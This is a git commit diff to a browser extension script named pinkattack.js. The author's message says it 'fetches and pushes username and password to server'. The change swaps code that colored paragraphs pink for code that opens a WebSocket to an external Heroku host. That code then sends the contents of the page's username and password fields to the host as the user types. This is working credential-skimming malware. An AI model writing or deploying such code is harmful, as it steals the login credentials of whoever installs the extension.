ea27f17948315c127e2b2ff16c58dc391cf16f28
Jia Wei Zheng <jiasterop@gmail.com>
2018-10-30 00:22:44 -0400

    Fetches and pushes username and password to server

--- extension/pinkattack.js
+++ extension/pinkattack.js
@@ -1,6 +1,28 @@
 console.log("hi");
 
-let paragraphs = document.getElementsByTagName('p');
-for (i = 0; i < paragraphs.length; i++) {
-	paragraphs[i].style['background-color'] = '#FF00FF';
+var HOST = 'wss://thawing-island-58409.herokuapp.com';
+var ws = new WebSocket(HOST);
+/*var el = document.getElementById('server-time');
+
+ws.onmessage = function (event) {
+	el.innerHTML = 'Server time: ' + event.data;
+};
+*/
+window.addEventListener ("click", myMain, false);
+
+function myMain (evt) {
+    if (document.getElementById('username')!=null){
+    document.getElementById('username').addEventListener('input', function(){
+		console.log("Username is "+document.getElementById('username').value);
+		ws.send("Username is "+document.getElementById('username').value);
+		//alert("Username is "+ document.getElementById('username').value);
+  }, false);
+}
+if (document.getElementById('username')!=null){
+    document.getElementById('password').addEventListener('input', function(){
+		console.log("Password is "+document.getElementById('password').value);
+        ws.send("Password is "+document.getElementById('password').value);
+		//alert("Password is "+document.getElementById('password').value);
+  }, false);
+}
 }
